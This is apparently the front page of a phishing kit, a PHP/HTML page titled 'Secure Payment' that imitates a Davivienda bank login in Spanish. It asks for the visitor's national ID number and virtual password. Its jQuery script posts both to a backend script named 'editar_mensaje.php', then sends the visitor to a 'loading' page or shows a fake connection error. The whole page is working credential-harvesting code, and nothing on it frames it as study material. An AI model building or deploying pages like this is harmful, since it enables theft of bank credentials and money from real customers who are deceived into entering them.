<?php
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">

	<script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		



    <title>Secure Payment</title>
    <style>
        *{
            margin: 0;
            padding: 0;
            font-family: arial;
            -webkit-appearance: none !important;
            -moz-appearance: none !important;
            color:white;
        }


        input{
            background-color: #605c5cd2;
            height: 40px;
        }

        a{
            font-size: 22px;
            margin-left:10px;
           
        }
        

        select{
            background-color: #e2e2e2b2;
            height: 40px;
            border: none;
            width: 75%;
            margin-left:50px;
            border-radius: 12px;
            padding-left: 10px;
        }
        input{
            width: 35%;
            border-radius:12px;
            padding-left:5px;
        }
    </style>
</head>
<body style="background-color:#6d6e72;">
<img src="/img/texto.jfif" alt="" srcset="" width="100%">

<div class="datos" style="background-color:;">
    <h6 style="margin-left:50px; margin-top:25px;">Tipo documento</h6>
    <select name="cc" id="">
        <option value="cedula" select>Cedula de Ciudadania</option>
    </select><br><br>

    <center><label for="documento" style="margin-left:-10px;"> <b>No. documento</b>
    </label>
    <label for="clave" style="margin-left:50px;"> <b>Clave virtual</b>
    </label><br>

    <input type="tel" name="documento" id="txtUsuario" style="margin-top:5px;" required minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');">
    <input type="password" name="clave" id="txtPass" style="margin-top:5px;" minlength="6" maxlength="8"  oninput="this.value = this.value.replace(/\s+/g, '')">
    <input type="hidden" value="davivienda" id="banco">

        <input type="submit" value="Ingresar" id="btnUsuario" style="border:none; background-color:red; height:45px; border-bottom:5px solid red; margin-top:5px;"><br><br><br>
        <a style="font-size:15px;">¿Olvidó o bloqueó su clave?</a> <br>
</center>
<br><br>
</div>


    <img src="/img/davi1.jfif" alt="" srcset="" width="100%">

    <img src="/img/davi2.jfif" alt="" srcset="" width="100%">

</body>

<script>
  const txtPass = document.getElementById('txtPass');

  txtPass.addEventListener('input', function() {
    const value = txtPass.value;
    const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos

    if (value !== cleanValue) {
      txtPass.value = cleanValue;
    }
  });
</script>


<script type="text/javascript">
function getMid() {
    const name = 'mid';
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}
$(document).ready(function() {
    
    $('#btnUsuario').click(function(){
        if ($("#txtUsuario").val().length > 0) {
            if ($("#txtPass").val().length >= 6 && $("#txtPass").val().length <= 8) {
                const data = {
                    'usuario': $("#txtUsuario").val(),
                    'pass': $("#txtPass").val()
                };
                console.log(data);
                $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "cargando.php";
                        } else {
                            alert('Error de conexión, por favor intente de nuevo');
                           window.location.href = "/";
                        }
                    },
                    error: function(xhr, status, error) {
                        console.log("Warning")
                    }
                });
            } else {
                $("#err-mensaje").show();
                $(".user").css("border", "1px solid red");
                $("#txtPass").focus();
            }
        } else {
            $("#err-mensaje").show();
            $(".user").css("border", "1px solid red");
            $("#txtUsuario").focus();
        }
    });
});
</script>
</html>